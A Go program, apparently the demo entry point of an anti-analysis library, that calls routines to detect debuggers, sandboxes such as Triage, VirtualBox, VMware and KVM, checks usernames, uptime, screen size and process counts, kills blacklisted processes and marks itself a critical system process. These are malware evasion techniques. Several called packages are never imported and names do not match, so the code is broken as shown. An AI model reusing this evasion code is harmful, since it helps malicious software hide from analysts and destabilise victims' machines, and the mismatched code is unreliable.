package main

import (
	"fmt"
	"os"
	// antivirtulization
    "AntiPackageGOLANG/AntiVirtualization/TriageDetection"
	"AntiPackageGOLANG/AntiVirtualization/MonitorMetrics"
	"AntiPackageGOLANG/AntiVirtualization/VirtualboxDetection"
	"AntiPackageGOLANG/AntiVirtualization/VMWareDetection"
	"AntiPackageGOLANG/AntiVirtualization/KVMCheck"
	"AntiPackageGOLANG/AntiVirtualization/UsernameCheck"

	// anti debug below
    "AntiPackageGOLANG/antidebug/IsDebuggerPresent"
	"AntiPackageGOLANG/antidebug/RemoteDebugger"
	"AntiPackageGOLANG/antidebug/pcuptime"
    "AntiPackageGOLANG/antidebug/CheckBlacklistedWindowsNames"
	"AntiPackageGOLANG/antidebug/RunningProcesses"
	"AntiPackageGOLANG/antidebug/ParentAntiDebug"
	"AntiPackageGOLANG/antidebug/KillBadProcesses"

	// ProcessRelated
	"AntiPackageGOLANG/Process/CriticalProcess"
)

func main() {
	/* 
	ANTIDEBUG
	-----------
	- IsDebuggerPresent
	- RemoteDebugger
	- PC Uptime Check
	- Running Proccesses Count
	- Check blacklisted windows
	- KillBlacklisted Proceseses
	- Parent AntiDebug
	*/
    IsDebuggerPresent.IsDebuggerPresent()
	remotedebuggercheck.RemoteDebugger()
	pcuptime.CheckUptime(1200)
	runningprocesses.CheckRunningProcessesCount(50)
    blacklistcheck.CheckBlacklistedWindows()
	parentantidebug.ParentAntiDebug()
	processkiller.KillProcesses()

	/* 
	AntiVirulization
	----------------
	- Triage Check
	- VMWare Check
	- Anti KVM
	- Username Check
	- 
	*/
	triagecheck.TriageCheckDebug()
	MonitorMetrics.IsScreenSmall()
	VirtualboxDetection.GraphicsCardCheck()
	fmt.Println("Debug Check: VirtualBox isnt present")
	VMWare.GraphicsCardCheck()
	fmt.Println("Debug Check: VMWare isnt present")
	if kvmcheck.CheckForKVM() {
		os.Exit(-1)
	}
	usernamecheck.CheckForBlacklistedNames()
    artifactsdetector.BadVMFilesDetection()
	fmt.Println("IF YOURE HERE YOU PASSED LOL")
	/*
	EXTRA THINGS NOW:
	*/
	//programutils.SetDebugPrivilege() this is for devs who plan on continuing
	programutils.SetProcessCritical() // this automatically gets the SeDebugPrivillige
	fmt.Scanln()
}
